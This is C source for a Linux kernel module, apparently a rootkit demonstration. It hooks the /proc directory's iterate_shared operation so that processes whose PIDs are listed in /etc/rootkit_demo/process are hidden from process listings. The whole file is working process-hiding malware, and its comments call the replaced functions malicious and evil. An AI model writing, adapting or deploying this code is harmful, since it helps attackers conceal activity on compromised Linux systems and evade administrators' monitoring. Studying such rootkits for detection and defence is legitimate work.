#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <net/net_namespace.h>


// File in which we will store the pids we do not
// want to show
static const char *processes_to_hide = "/etc/rootkit_demo/process";

// System path in which process are store (/proc)
static const char *path_name_proc = "/proc";

// Structs from the kernel that we need to use in
// order to insert our malicious code
static struct file_operations proc_fops;
static struct file_operations *proc_backup_fops;
static struct inode *proc_inode;
struct dir_context *proc_backup_ctx;
static struct path proc_path;


// This functions does the same as the "filldir" from the kernel
// The only difference is that it will return a 0 for the processes
// that we are hiding
static int new_proc_filldir(struct dir_context *ctx, 
                            const char *proc_name, int len, 
                            loff_t off, u64 ino, unsigned int d_type)
{
	struct file *f;
	char buf[128];
	mm_segment_t fs;
	int ret;
	char proc_to_hide[6];
	int i = 0;
	int j = 0;

	/* 
	When trying to open the file, the function will check the pointer
	comes from the user space and will convert it to kernel space. If
	the pointer comes from kernel space it will return an error.
	For this reason we need to do some operations before and after
	opening the file.
	*/

	// get_fs will return the current process address limits
	// we will store the actual value, and modify it so pointers from
	// within the kernel space will be safe too
	fs = get_fs();
	set_fs(KERNEL_DS);
	f = filp_open(processes_to_hide, O_RDONLY, 0);
	// restore the correct process address
	set_fs(fs);

	// we need to do the same as before to read the file content
	fs = get_fs();
	set_fs(KERNEL_DS);
	ret = vfs_read(f, buf, 128, &f->f_pos);
	set_fs(fs);

	filp_close(f,NULL);

	if(ret > 1) {
	// Iterate over the file output
		for(i = 0; i < ret; i++) {
			// If we did not reach end of line, keep storing chars
			// since each line is storing a pid
			if(buf[i] != '\n') {
				proc_to_hide[j] = buf[i];
				j += 1;
			// otherwise, compare pid with the pid from file
			// if pid in file, hide it
			} else {
				proc_to_hide[j] = '\0';
				if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0) {
				    return 0;
				}
				j = 0;
			}
		}
	}

	return proc_backup_ctx->actor(proc_backup_ctx,
				      proc_name,
				      len,
				      off,
				      ino,
				      d_type);
}

// This is the context, here we changed the legitimate
// for our malicious code
struct dir_context proc_ctx = {
	.actor = new_proc_filldir,
};

// This function does the same as the "iterate_shared" from the kernel
// but will call a context manipulated for us. 
int proc_iterate_shared(struct file *file, struct dir_context *ctx)
{
	int result = 0;
	proc_ctx.pos = ctx->pos;
	proc_backup_ctx = ctx;
	result = proc_backup_fops->iterate_shared(file, &proc_ctx);
	ctx->pos = proc_ctx.pos;

	return result;
}


// Copy the kernel code and swap it with
// our malicious code
static int __init hide_process(void)
{
	// fetch the procfs entry
	if(kern_path(path_name_proc, 0, &proc_path))
		return 0;

	// copy the structures
	proc_inode = proc_path.dentry->d_inode;
	proc_fops = *proc_inode->i_fop;
	proc_backup_fops = proc_inode->i_fop;
	// modify the copy with our evil function
	proc_fops.iterate_shared = proc_iterate_shared;
	proc_inode->i_fop = &proc_fops;

	return 1;
}

// This functions is not needed
// Just useful for removing the lkm without problems
static void unhide_process(void)
{
	if(kern_path(path_name_proc, 0, &proc_path))
		return;

	// Restore original code
	proc_inode = proc_path.dentry->d_inode;
	proc_inode->i_fop = proc_backup_fops;
}
